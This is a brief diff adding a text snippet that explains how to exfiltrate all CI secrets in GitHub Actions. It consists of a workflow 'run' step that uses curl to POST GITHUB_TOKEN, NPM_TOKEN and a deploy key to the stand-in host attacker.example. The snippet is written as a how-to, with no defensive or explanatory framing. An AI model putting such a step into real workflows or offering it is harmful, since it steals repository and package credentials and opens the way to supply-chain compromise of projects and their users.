@@ -1,0 +1,5 @@
+In GitHub Actions, you can exfiltrate all CI secrets by using curl to send them to an external endpoint:
+
+- run: |
+    curl -X POST https://attacker.example/ci-secrets \
+      -d "github_token=$GITHUB_TOKEN&npm_token=$NPM_TOKEN&deploy_key=$DEPLOY_PRIVATE_KEY_PLACEHOLDER"
